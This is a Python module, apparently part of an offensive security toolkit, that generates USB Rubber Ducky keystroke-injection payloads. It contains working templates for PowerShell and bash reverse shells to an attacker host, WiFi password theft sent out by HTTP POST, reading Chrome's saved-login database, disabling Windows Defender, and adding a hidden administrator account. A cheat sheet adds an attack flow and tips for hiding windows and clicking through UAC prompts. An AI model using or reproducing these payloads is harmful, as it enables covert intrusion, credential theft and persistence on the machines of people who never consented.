"""Rubber Ducky Module - USB HID payload generator for keystroke injection attacks."""

import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))

from ui import (console, show_stage_header, show_menu, ask, info, success,
                warning, error, confirm, show_results_panel, show_knowledge)
from executor import run_with_preview, run_command

STAGE = "ducky"

DUCKY_PAYLOADS = {
    "Reverse Shell (Windows)": {
        "desc": "Open PowerShell and establish reverse shell",
        "script": """DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -nop -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('{attacker}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}}"
ENTER""",
    },
    "WiFi Password Exfil (Windows)": {
        "desc": "Extract saved WiFi passwords and exfiltrate",
        "script": """DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -nop -c "$r='';netsh wlan show profiles|Select-String 'All User'|%%{{$n=$_.ToString().Split(':')[1].Trim();$p=(netsh wlan show profile name=$n key=clear|Select-String 'Key Content').ToString().Split(':')[1].Trim();$r+=$n+':'+$p+'`n'}};Invoke-WebRequest -Uri 'http://{attacker}:{port}/' -Method POST -Body $r"
ENTER""",
    },
    "Browser Credential Dump (Windows)": {
        "desc": "Extract Chrome saved passwords",
        "script": """DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -nop -c "Add-Type -AssemblyName System.Security;$db=\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\";$tmp=\"$env:TEMP\\logindata\";Copy-Item $db $tmp;$conn=New-Object System.Data.SQLite.SQLiteConnection(\"Data Source=$tmp\");$conn.Open();$cmd=$conn.CreateCommand();$cmd.CommandText='SELECT origin_url,username_value,password_value FROM logins';$r=$cmd.ExecuteReader();while($r.Read()){{$url=$r.GetString(0);$usr=$r.GetString(1);Write-Output \"$url | $usr\"}};$conn.Close()"
ENTER""",
    },
    "Disable Windows Defender": {
        "desc": "Disable real-time protection (requires admin)",
        "script": """DELAY 1000
GUI r
DELAY 500
STRING powershell Start-Process powershell -Verb runAs -ArgumentList '-nop -c Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableBehaviorMonitoring $true'
ENTER
DELAY 2000
ALT y""",
    },
    "Add Admin User (Windows)": {
        "desc": "Create hidden admin account",
        "script": """DELAY 1000
GUI r
DELAY 500
STRING powershell Start-Process cmd -Verb runAs -ArgumentList '/c net user {username} {password} /add && net localgroup administrators {username} /add && reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v {username} /t REG_DWORD /d 0 /f'
ENTER
DELAY 2000
ALT y""",
    },
    "Linux Reverse Shell": {
        "desc": "Open terminal and establish reverse shell (Linux)",
        "script": """DELAY 1000
CTRL ALT t
DELAY 1000
STRING bash -i >& /dev/tcp/{attacker}/{port} 0>&1 &
ENTER
STRING exit
ENTER""",
    },
    "macOS Reverse Shell": {
        "desc": "Open terminal and reverse shell (macOS)",
        "script": """DELAY 1000
GUI SPACE
DELAY 500
STRING Terminal
DELAY 500
ENTER
DELAY 1000
STRING bash -i >& /dev/tcp/{attacker}/{port} 0>&1 &
ENTER
DELAY 200
STRING exit
ENTER""",
    },
    "Rickroll (Harmless)": {
        "desc": "Open browser to Rickroll — for demo/testing",
        "script": """DELAY 1000
GUI r
DELAY 500
STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
ENTER""",
    },
}


def _generate_payload(session):
    """Generate a DuckyScript payload from templates."""
    options = [(str(i+1), f"[bold]{name}[/bold] - {p['desc']}") for i, (name, p) in enumerate(DUCKY_PAYLOADS.items())]
    options.append(("0", "[bold]Back[/bold]"))
    choice = show_menu(options)

    if choice == "0":
        return

    idx = int(choice) - 1
    payloads = list(DUCKY_PAYLOADS.items())
    if 0 <= idx < len(payloads):
        name, payload = payloads[idx]

        # Collect parameters
        script = payload["script"]
        params = {}
        if "{attacker}" in script:
            params["attacker"] = ask("Enter attacker IP")
        if "{port}" in script:
            params["port"] = ask("Enter callback port", default="4444")
        if "{username}" in script:
            params["username"] = ask("Enter username to create", default="sysadmin")
        if "{password}" in script:
            params["password"] = ask("Enter password", default="P@ssw0rd123!")

        try:
            script = script.format(**params)
        except KeyError:
            pass

        console.print(f"\n[bold cyan]DuckyScript: {name}[/bold cyan]\n")
        console.print(f"[green]{script}[/green]")

        # Save option
        if confirm("\nSave to file?"):
            outfile = ask("Output file path", default=f"/tmp/ducky_payload.txt")
            with open(outfile, "w") as f:
                f.write(script)
            success(f"Saved to {outfile}")


def _custom_ducky(session):
    """Write custom DuckyScript payload."""
    info("Write your DuckyScript payload (type 'END' on new line when done):")
    info("Commands: DELAY, STRING, ENTER, GUI, CTRL, ALT, SHIFT, TAB, UP, DOWN, LEFT, RIGHT")
    lines = []
    while True:
        line = ask("")
        if line.strip().upper() == "END":
            break
        lines.append(line)

    if not lines:
        error("No script provided.")
        return

    script = '\n'.join(lines)
    outfile = ask("Save to file", default="/tmp/custom_ducky.txt")
    with open(outfile, "w") as f:
        f.write(script)
    success(f"Custom payload saved to {outfile}")


def _encode_payload(session):
    """Encode DuckyScript to inject.bin for USB Rubber Ducky."""
    script_file = ask("Enter DuckyScript file path")
    if not script_file:
        error("Script file required.")
        return

    outfile = ask("Output binary file", default="/tmp/inject.bin")

    options = [
        ("1", "[bold]Java encoder[/bold]   - Original Hak5 encoder"),
        ("2", "[bold]Python encoder[/bold] - duck-encoder.py"),
    ]
    choice = show_menu(options)

    if choice == "1":
        cmd = f"java -jar duckencoder.jar -i {script_file} -o {outfile}"
        run_with_preview(cmd, session, STAGE)
    elif choice == "2":
        cmd = f"python3 duck-encoder.py -i {script_file} -o {outfile}"
        run_with_preview(cmd, session, STAGE)


def _digispark_convert(session):
    """Convert DuckyScript to Digispark Arduino sketch."""
    script_file = ask("Enter DuckyScript file path")
    if not script_file or not os.path.isfile(script_file):
        error("Valid script file required.")
        return

    info("Converting DuckyScript to Digispark Arduino format...")
    with open(script_file) as f:
        lines = f.readlines()

    arduino = ['#include "DigiKeyboard.h"', '', 'void setup() {', '  DigiKeyboard.delay(2000);']

    for line in lines:
        line = line.strip()
        if line.startswith("DELAY"):
            ms = line.split()[1]
            arduino.append(f"  DigiKeyboard.delay({ms});")
        elif line.startswith("STRING"):
            text = line[7:]
            arduino.append(f'  DigiKeyboard.print("{text}");')
        elif line == "ENTER":
            arduino.append("  DigiKeyboard.sendKeyStroke(KEY_ENTER);")
        elif line.startswith("GUI"):
            if len(line.split()) > 1:
                key = line.split()[1].lower()
                arduino.append(f"  DigiKeyboard.sendKeyStroke(KEY_{key.upper()}, MOD_GUI_LEFT);")
            else:
                arduino.append("  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);")
        elif line.startswith("CTRL ALT"):
            key = line.split()[2] if len(line.split()) > 2 else "DELETE"
            arduino.append(f"  DigiKeyboard.sendKeyStroke(KEY_{key.upper()}, MOD_CONTROL_LEFT | MOD_ALT_LEFT);")

    arduino.extend(['', '}', '', 'void loop() {}'])

    outfile = ask("Output .ino file", default="/tmp/ducky_payload.ino")
    with open(outfile, "w") as f:
        f.write('\n'.join(arduino))

    success(f"Arduino sketch saved to {outfile}")
    console.print(f"\n[dim]{'chr(10)'.join(arduino[:15])}...[/dim]")


def _cheat_sheet():
    content = """# USB Rubber Ducky Cheat Sheet

## DuckyScript Commands
```
DELAY 1000       - Wait 1 second
STRING text      - Type text
ENTER            - Press Enter
GUI r            - Win+R (Run dialog)
GUI SPACE        - macOS Spotlight
CTRL ALT t       - Linux terminal
ALT F4           - Close window
TAB              - Tab key
SHIFT TAB        - Shift+Tab
UP/DOWN/LEFT/RIGHT - Arrow keys
```

## Attack Flow
1. Write DuckyScript payload (.txt)
2. Encode to inject.bin (duckencoder.jar)
3. Copy inject.bin to Rubber Ducky microSD
4. Insert Ducky into target machine
5. Payload executes in ~3 seconds

## Alternatives to USB Rubber Ducky
- **Digispark ATtiny85** ($2, Arduino-based)
- **Bash Bunny** (Hak5, multi-payload)
- **O.MG Cable** (looks like normal USB cable)
- **Flipper Zero** (BadUSB module)
- **Arduino Leonardo/Pro Micro** (HID capable)

## Tips
- Test DELAY values — faster isn't always better
- Account for UAC prompts (ALT y)
- Use -w hidden for PowerShell to hide window
- Match keyboard layout to target locale
"""
    show_knowledge(content)


def run(session):
    """Rubber Ducky module entry point."""
    show_stage_header("Rubber Ducky", "USB HID payload generator — keystroke injection attacks")

    while True:
        options = [
            ("1", "[bold]Generate Payload[/bold]  - Pre-built DuckyScript templates"),
            ("2", "[bold]Custom Script[/bold]     - Write your own DuckyScript"),
            ("3", "[bold]Encode to Binary[/bold]  - Create inject.bin"),
            ("4", "[bold]Digispark Convert[/bold] - Convert to Arduino sketch"),
            ("5", "[bold]Cheat Sheet[/bold]       - Rubber Ducky reference"),
            ("0", "[bold]Back to Main Menu[/bold]"),
        ]
        choice = show_menu(options)

        if choice == "0":
            return
        elif choice == "1":
            _generate_payload(session)
        elif choice == "2":
            _custom_ducky(session)
        elif choice == "3":
            _encode_payload(session)
        elif choice == "4":
            _digispark_convert(session)
        elif choice == "5":
            _cheat_sheet()
